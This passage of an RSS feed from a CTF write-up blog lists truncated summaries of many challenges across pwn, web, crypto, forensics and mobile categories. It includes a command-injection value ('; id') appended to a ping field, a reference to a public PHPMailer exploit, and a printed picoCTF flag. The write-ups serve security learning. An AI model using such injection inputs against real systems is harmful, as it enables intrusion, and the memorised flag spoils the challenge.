&amp;lt;?php class IndexController extends Controller { public function __construct() { parent::__construct(); } public function index($router) { $router-&amp;gt;view('index'); } public function getfacts($router) { $jsondata = json_decode(file_get_contents('php://input'), true); if ( empty($jsondata) || !array_key_exists('type', $jsondata)) { return $router-&amp;gt;jsonify(['message' =&amp;gt; 'Insufficient parameters!']); } if ($jsondata['type'] === 'secrets' &amp;amp;&amp;amp; $_SERVER['REMOTE_ADDR'] !</description></item><item><title>Keep Tryin'</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/keep-tryin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/keep-tryin/</guid><description>We are given a PCAP file with some of TCP segments, HTTP messages and DNS queries:
HTTP traffic First of all, let&amp;rsquo;s analyze the HTTP messages:
The first one looks useless, it only shows TryHarder. And the second one has a Base64-encoded string: S2VlcCB0cnlpbmcsIGJ1ZmZ5Cg==. But&amp;hellip;
$ echo S2VlcCB0cnlpbmcsIGJ1ZmZ5Cg== | base64 -d Keep trying, buffy DNS queries These are the DNS queries above:
They look very strange. In fact, the first one contains a Base64-encoded string:</description></item><item><title>Kerbab</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/kerbab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/kerbab/</guid><description>We are provided with a Linux file system and other common files in kernel exploitation challenges:
# ls -lh total 12M -rw-r--r-- 1 root root 618 Feb 25 23:21 Dockerfile -rwxr-xr-x 1 root root 59 Feb 25 23:21 deploy_docker.sh -rw-r--r-- 1 root root 155 Feb 25 23:21 docker-compose.yml -rw-r--r-- 1 root root 2.4M Feb 25 23:21 initramfs.cpio.gz -rw-r--r-- 1 root root 6.2K Feb 25 23:21 kebab.c drwxr-xr-x 7 root root 4.</description></item><item><title>Kernel Adventures: Part 1</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/kernel-adventures-part-1/</guid><description>We are given a Linux file system and some other files common in kernel exploitation challenges:
# ls -lh total 12M -rw-r--r-- 1 root root 8,1M dic 11 2019 bzImage -rw-r--r-- 1 root root 84 dic 11 2019 notes.txt -rw-r--r-- 1 root root 3,2M dic 11 2019 rootfs.cpio.gz -rwxr-xr-x 1 root root 262 dic 11 2019 run.sh # cat notes.txt I removed the password hashes in the file I gave you.</description></item><item><title>Kernel searcher</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/kernel-searcher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/kernel-searcher/</guid><description>I have a super secret isogeny. Wanna know where your point ends up? Just send me your favourite coordinates.
Challenge contributed by CryptoHack
Challenge files:
Dockerfile entry.sh kernel_searcher.sage kernel_searcher.xinetd We are given a SageMath script that hides the flag under an isogeny and allows us to evaluate the isogeny in any point we desire.
Source code analysis The relevant part of the script is this one:
import json from Crypto.</description></item><item><title>knote</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/knote/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/knote/</guid><description>We are given a Linux file system and some other files common in kernel exploitation challenges:
$ tree . ├── debug │ ├── bzImage │ ├── qemu-cmd │ └── rootfs.img ├── knote.c └── knote.ko 1 directory, 5 files This is debug/qemu-cmd:
#!/bin/bash timeout --foreground 35 qemu-system-x86_64 \ -m 128M \ -nographic \ -kernel /home/ctf/bzImage \ -append 'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr' \ -monitor /dev/null \ -initrd /home/ctf/rootfs.img \ -no-kvm \ -cpu qemu64 \ -smp cores=2 It is basically a large command to run the kernel image with qemu.</description></item><item><title>Kryptos Support</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/kryptos-support/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/kryptos-support/</guid><description>We are provided with this webpage:
It allows us to send messages that will be reviewed by an administrator:
Enumeration Since we don&amp;rsquo;t have any source code, let&amp;rsquo;s start using ffuf to enumerate some routes:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://188.166.146.25:32282/FUZZ [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 46ms] * FUZZ: login [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 37ms] * FUZZ: admin [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 39ms] * FUZZ: static [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 41ms] * FUZZ: Login [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 37ms] * FUZZ: logout [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 36ms] * FUZZ: settings [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 39ms] * FUZZ: tickets [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 68ms] * FUZZ: Admin [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 39ms] * FUZZ: Logout [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 39ms] * FUZZ: Static [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 62ms] * FUZZ: Tickets [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 36ms] * FUZZ: SETTINGS [Status: 200, Size: 2067, Words: 934, Lines: 54, Duration: 39ms] * FUZZ: [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %C0 [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 41ms] * FUZZ: LogIn [Status: 200, Size: 2352, Words: 1056, Lines: 53, Duration: 42ms] * FUZZ: LOGIN [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 39ms] * FUZZ: %CF [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %CD [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %CE [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %D8 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %CC [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %CB [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %CA [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %D0 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 38ms] * FUZZ: %D1 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 36ms] * FUZZ: %D7 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %D6 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %D5 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %D4 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 37ms] * FUZZ: %C2 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %C8 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %C9 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 44ms] * FUZZ: %C1 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 48ms] * FUZZ: %D2 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 48ms] * FUZZ: %D3 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 39ms] * FUZZ: %C6 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %C7 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 38ms] * FUZZ: %C4 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 41ms] * FUZZ: %C5 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %C3 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %D9 [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 39ms] * FUZZ: %DD [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %DE [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 42ms] * FUZZ: %DF [Status: 500, Size: 35, Words: 3, Lines: 1, Duration: 40ms] * FUZZ: %DB We see that we have a login page:</description></item><item><title>La casa de papel</title><link>https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/</guid><description>We are provided with a 64-bit binary called chall:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) In addition, we have the source code in C. The program is a notes manager with a fairly typical menu:
$ ./chall ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡒⠦⠤⠤⠄⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⢼⠀⠀⠒⠒⠤⠤⠤⠤⠤⣀⣀⣀⣀⠀⠀⠘⡇⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⢀⣀⠤⠔⠒⠉⠁⢀⣼⡀⠀⢠⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡧⠚⠉⢹⡀⠀⠀⠀⠀⠀⠀ ⠰⣖⠊⠉⠀⠀⠀⣠⠔⠚⠉⠁⢀⡇⠀⡀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⢀⡇⠀⣤⠀⢷⡀⠀⠀⠀⠀⠀ ⠀⠈⠳⡄⠀⠀⠋⣠⠖⠂⡠⠖⢙⡇⠀⠈⠉⠉⠉⠉⠓⠒⠒⠒⠒⠒⠆⠀⠀⣷⡀⠉⢦⠀⢳⡀⠀⠀⠀⠀ ⠀⠀⠀⠈⢦⠀⠀⠁⠀⠀⠀⢀⠼⡇⠀⠀⠦⠤⠤⠄⡀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠱⡀⠀⠳⡀⠙⣆⠀⠀⠀ ⠀⠀⠀⠀⠀⠳⡄⠀⢀⡤⠊⠁⢠⡇⠀⠠⠤⢤⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⡧⡀⠙⢄⠀⠱⠄⠈⠳⡄⠀ ⠀⠀⠀⠀⠀⠀⠙⡄⠀⠀⡠⠔⢻⠀⠀⠀⠀⠀⠀⠠⣄⣀⣀⣁⣀⠀⠀⠀⠀⡇⠱⡀⠀⠀⠀⠀⠀⣀⣘⣦ ⠀⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⡸⠀⠀⠰⣄⣀⡀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⡇⠀⠃⢀⣠⠴⠛⠉⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠙⠒⠀⠀⠀⠠⡇⣠⠔⠋⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢸⠁⠀⠀⠀⠒⠲⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⢰⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠢⣄⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣀⠀⠀⠀⠀⠀⠀⠀⠢⠤⣀⠀⠀⠁⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢡⠉⠙⠒⠤⢤⡀⠀⠀⠀⠀⠉⠒⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠶⠒⠊⠉⠉⠉⠓⠦⣀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⢄⡀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠲⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ What would you like to do?</description></item><item><title>Labyrinth</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/labyrinth/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/labyrinth/</guid><description>We are given a 64-bit binary called labyrinth:
Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./glibc/' Reverse engineering If we open it in Ghidra, we will see this main function in decompiled C code:
int main() { int ret; char *__s; char data[32]; ulong i; setup(); banner(); data._0_8_ = 0; data._8_8_ = 0; data._16_8_ = 0; data._24_8_ = 0; fwrite("\nSelect door: \n\n"</description></item><item><title>Lazy Ballot</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/lazy-ballot/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/lazy-ballot/</guid><description>We are given a website like this:
We are also given the server source code in Node.js.
Source code analysis This is routes/index.js:
const express = require("express"); const router = express.Router({ caseSensitive: true }); const AuthMiddleware = require("../middleware/auth"); let db; const response = (data) =&amp;gt; ({ resp: data }); router.get("/", (req, res) =&amp;gt; { return res.render("index.pug"); }); router.get("/login", async (req, res) =&amp;gt; { if (req.session.authenticated) { return res.redirect("/dashboard"); } return res.</description></item><item><title>Lazy Game Challenge</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/lazy-game-challenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/lazy-game-challenge/</guid><description>We are given a service that consists of a betting system. We bet a certain amount of money and we need to guess a number between 1 and 10 in less than 10 attempts. For example:
$ nc thekidofarcrania.com 10001 Welcome to the Game of Luck !. Rules of the Game : (1) You will be Given 500$ (2) Place a Bet (3) Guess the number what computer thinks of !</description></item><item><title>Leet Test</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/leet-test/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/leet-test/</guid><description>We are given a 64-bit binary called leet_test:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) If we open it in Ghidra, we find this decompiled source code in C:
uint winner = 0xcafebabe; void main() { long in_FS_OFFSET; uint random; int urandom_fd; int flag_fd; void *flag; char name[280]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); initialize(); urandom_fd = open("/dev/urandom", 0); read(urandom_fd, &amp;amp;random, 4); close(urandom_fd); random = random &amp;amp; 0xffff; while (true) { printf("</description></item><item><title>Lesson</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/lesson/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/lesson/</guid><description>We are given a binary file called main and its source code in C:
#include &amp;lt;stdio.h&amp;gt; void under_construction(){ printf("This is under development\n"); } void print_msg(char *user){ char formatter[0x20]; strncpy(formatter, user, 5); for (size_t i = 0; i &amp;lt; 5; i++) formatter[i] = tolower(formatter[i]); printf(strncmp(formatter, "admin", 5) == 0 ? "\nWelcome admin!\n\n" : "\nWelcome user!\n\n"); } int main(int argc, char **argv){ char name[0x20] = {0}; unsigned long x, y; printf("Enter your name: "</description></item><item><title>Letter Dispair</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/letter-dispair/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/letter-dispair/</guid><description>We are provided with this webpage:
It shows a directory listing. If we go to /mailer.php we will have this website to send emails:
The mailer.zip file contains the mailer.php source code. It is quite large to insert it here.
The key thing is that it uses PHPMailer, which is vulnerable to CVE-2016-10033 and CVE-2016-10045. In fact, there are public exploits like the one in www.exploit-db.com.
Basically, the exploit says to enter this payload as the email:</description></item><item><title>Logger</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/logger/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/logger/</guid><description>We are given a PCAP file called keystrokes.pcapng with some USB events:
Identifying the device The second event shows that the USB device is a keyboard:
Therefore, we will need to analyze key strokes. Hardware devices use a protocol known as Human Interface Device (HID). More information can be found at Wikipedia. In fact, there is a documentation manual attached: www.usb.org, where some HID tables are found (Section 10: &amp;ldquo;Keyboard/Keypad Page (0x07)&amp;rdquo;):</description></item><item><title>Login Please</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/login-please/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/login-please/</guid><description>We are supposed to log in here: http://puzzler7.imaginaryctf.org:5001/:
If we inspect the HTML code, we will see a comment that points to /source:
So we have the source code used by the server:
const express = require('express') const crypto = require('crypto') function md5(text) { return crypto.createHash('md5').update(text).digest('hex') } const app = express() const users = { guest: '084e0343a0486ff05530df6c705c8bb4', admin: '21232f297a57a5a743894a0e4a801fc3', '1337hacker': '2ab96390c7dbe3439de74d0c9b0b1767' } const localIPs = ['127.0.0.1', '::1', '::ffff:127.0.0.1'] app.use(express.urlencoded({ extended: false })) app.</description></item><item><title>Lookey here</title><link>https://7rocky.github.io/en/ctf/picoctf/forensics/lookey-here/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/forensics/lookey-here/</guid><description>We are given a large text file called anthem.flag.txt:
$ wc -l anthem.flag.txt 2146 anthem.flag.txt 2146 are a lot to search the flag by hand. Instead, we can use grep to find the flag given that they have a special format format (picoCTF{...}):
$ grep picoCTF anthem.flag.txt we think that the men of picoCTF{gr3p_15_@w3s0m3_4c479940}</description></item><item><title>looking glass</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/looking-glass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/looking-glass/</guid><description>We are provided with this webpage:
There is a feature to use ping command:
The problem might be related to command injection, because probably the server does something like this:
&amp;lt;?php $cmd = 'ping -c 4 ' . $_POST['ip_address']; system($cmd); Maybe not in PHP, but the concept is the same. Hence, we can try and add a semicolon to inject another system command (; id):
There it is, the server is vulnerable to command injection, which derives in Remote Code Execution (RCE).</description></item><item><title>Lost Flag</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/lost-flag/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/lost-flag/</guid><description>We have a ZIP file called flag.zip that contains a JPEG image and also a .DS_Store file, which is a temporary file for macOS machines:
$ file flag.zip flag.zip: Zip archive data, at least v2.0 to extract, compression method=store $ unzip -v flag.zip Archive: flag.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 0 Stored 0 0% 07-03-2022 05:49 00000000 flag/ 86710 Defl:N 86391 0% 07-03-2022 05:29 a0cfb753 flag/flag.</description></item><item><title>Lost Modulus</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/lost-modulus/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/lost-modulus/</guid><description>We are given a short Python code to encrypt the flag, and we are given the ciphertext in hexadecimal:
#!/usr/bin/python3 from Crypto.Util.number import getPrime, long_to_bytes, inverse flag = open('flag.txt', 'r').read().strip().encode() class RSA: def __init__(self): self.p = getPrime(512) self.q = getPrime(512) self.e = 3 self.n = self.p * self.q self.d = inverse(self.e, (self.p-1)*(self.q-1)) def encrypt(self, data: bytes) -&amp;gt; bytes: pt = int(data.hex(), 16) ct = pow(pt, self.e, self.n) return long_to_bytes(ct) def decrypt(self, data: bytes) -&amp;gt; bytes: ct = int(data.</description></item><item><title>LoveTok</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/lovetok/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/lovetok/</guid><description>We are given the following website:
We also have the PHP source code of the server.
Source code analysis There is only one controller (controllers/TimeController.php):
&amp;lt;?php class TimeController { public function index($router) { $format = isset($_GET['format']) ? $_GET['format'] : 'r'; $time = new TimeModel($format); return $router-&amp;gt;view('index', ['time' =&amp;gt; $time-&amp;gt;getTime()]); } } As can be seen, it takes a format parameter and calls TimeModel (models/TimeModel.php):
&amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;format = addslashes($format); [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&amp;gt;prediction = "</description></item><item><title>Lucky Faucet</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/lucky-faucet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/lucky-faucet/</guid><description>We are given a Solidity file called LuckyFaucet.sol:
// SPDX-License-Identifier: MIT pragma solidity 0.7.6; contract LuckyFaucet { int64 public upperBound; int64 public lowerBound; constructor() payable { // start with 50M-100M wei Range until player changes it upperBound = 100_000_000; lowerBound = 50_000_000; } function setBounds(int64 _newLowerBound, int64 _newUpperBound) public { require(_newUpperBound &amp;lt;= 100_000_000, "100M wei is the max upperBound sry"); require(_newLowerBound &amp;lt;= 50_000_000, "50M wei is the max lowerBound sry"); require(_newLowerBound &amp;lt;= _newUpperBound); // why?</description></item><item><title>Lucky Number</title><link>https://7rocky.github.io/en/ctf/other/hack.lu-ctf/lucky-number/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hack.lu-ctf/lucky-number/</guid><description>We are given the server source code in Python:
#!/usr/bin/env python #hacklu23 Baby Crypyo Challenge import math import random from Crypto.Cipher import AES from Crypto.Random import get_random_bytes import base64 import os def add(e): return e+(length-len(e)%length)*chr(length-len(e)%length) def remove(e): return e[0:-ord(e[-1:])] length=16 def main(): flag= os.environ["FLAG"] print("Starting Challenge") key=get_random_bytes(32) message=add(flag) iv=get_random_bytes(length) cipher=AES.new(key,AES.MODE_CBC,iv) cipher_bytes=base64.b64encode(iv+cipher.encrypt(message.encode("utf8"))) print(cipher_bytes.decode()) for l in range(0,5): A=[] print("You know the moment when you have this special number that gives you luck?</description></item><item><title>LunaCrypt</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/lunacrypt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/lunacrypt/</guid><description>The challenge provides an output file with encrypted data and the source code used to it. However, the code is a little difficult to read because there are a lot of functions:
import math from random import randint, seed from time import time, process_time strchr = lambda x: chr(x) strbyt = lambda x, y=0: ord(x[y]) bitlst = lambda x, y: x &amp;lt;&amp;lt; y bitrst = lambda x, y: x &amp;gt;&amp;gt; y bitext = lambda x, y, z=1: bitrst(x, y) &amp;amp; int(math.</description></item><item><title>Lure</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/lure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/lure/</guid><description>We are given a Microsoft Office Word file named UrgentPayment.doc:
$ file UrgentPayment.doc UrgentPayment.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: Ian Austin, Template: Normal.dotm, Last Saved By: egre55, Revision Number: 4, Name of Creating Application: Microsoft Office Word, Total Editing Time: 40:00, Create Time/Date: Tue Nov 3 18:07:00 2020, Last Saved Time/Date: Tue Nov 3 18:57:00 2020, Number of Pages: 1, Number of Words: 2, Number of Characters: 12, Security: 0 VBA macros extraction With olevba from oletools we are able to extract VBA macros code:</description></item><item><title>M0rsarchive</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/m0rsarchive/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/m0rsarchive/</guid><description>We are given these files:
$ file * flag_999.zip: Zip archive data, at least v1.0 to extract, compression method=store pwd.png: PNG image data, 25 x 3, 8-bit/color RGB, non-interlaced Testing The ZIP file is protected with password, and this is pwd.png:
It&amp;rsquo;s quite hard to distinguish what&amp;rsquo;s encoded in the image, but it&amp;rsquo;s actually Morse code. This time, it contains &amp;ldquo;9&amp;rdquo;. We must guess that it&amp;rsquo;s the password for the ZIP archive:</description></item><item><title>Manager</title><link>https://7rocky.github.io/en/ctf/htb-challenges/mobile/manager/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/mobile/manager/</guid><description>We are given an APK file (Manager.apk) and a README.txt file:
1. Install this application in an API Level 29 or earlier (i.e. Android 10.0 (Google APIs)). 2. In order to connect to the server when first running the application, insert the IP and PORT that you are provided in the description. As can be seen, the Android application will connect to a remote server, so probably we will be analyzing that communication.</description></item><item><title>MarketDump</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/marketdump/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/marketdump/</guid><description>We are given a PCAP file with a lot of TCP segments:
Network traffic analysis We can open it in Wireshark and take a look at all the protocols captured in the file (&amp;ldquo;Statistics &amp;gt; Protocol Hierarchy&amp;rdquo;):
The most suspicious protocol that has been used is Telnet, which is a protocol that is employed to connect to another machine. However, it is not secure because everything travels in plaintext. Moreover, we can see that 46 packets were using Telnet.</description></item><item><title>Math Door</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/math-door/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/math-door/</guid><description>We are given a 64-bit binary called math-door:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' Setup environment We are also provided with the remote Glibc library and loader:
$ ./ld.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Math Door</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/math-door/</guid><description>We are given a 64-bit binary called math-door:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'.' Setup environment We are also provided with the remote Glibc library and loader:
$ ./ld.so ./libc.so.6 GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31. Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</description></item><item><title>Mayday Mayday</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/mayday-mayday/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/mayday-mayday/</guid><description>We are given the Python source code to encrypt the flag:
